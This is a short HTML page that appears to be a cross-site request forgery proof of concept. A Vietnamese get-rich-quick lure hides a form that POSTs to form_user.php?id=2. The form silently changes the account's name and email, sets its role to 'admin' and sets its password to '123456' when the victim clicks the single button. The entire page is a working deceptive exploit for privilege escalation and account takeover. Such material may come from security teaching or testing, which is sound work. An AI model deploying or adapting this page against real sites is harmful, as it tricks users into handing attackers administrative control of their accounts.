
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kiem hang tram trieu dong 1 gio</title>
</head>

<body>
    <a href=""></a>
    <h1> Bạn có thể kiếm hàng trăm triệu đồng </h1>
    <form method="POST" action="form_user.php?id=2">
    <input type="hidden" name="id" value="2">
        <div class="form-group">
            <input class="form-control" name="name" placeholder="Name" value="user3" hidden>
        </div>
        <div class="form-group">
            <input class="form-control" name="fullname" placeholder="Fullname" value="user3" hidden>
        </div>

        <div class="form-group">
            <input class="form-control" name="email" placeholder="Email" value="user3@gmail.com" hidden>
        </div>

        <div class="form-group">
            <select class="form-control" name="type" hidden>
                <option value="admin" selected></option>
            </select>
        </div>
        <div class="form-group">
            <input type="password" name="password" value="123456" class="form-control" placeholder="Password" hidden>
        </div>

        <button type="submit" name="submit" value="submit" class="btn btn-primary">Bam vao de duoc huong dan chi tiet</button>
    </form>
</body>

</html>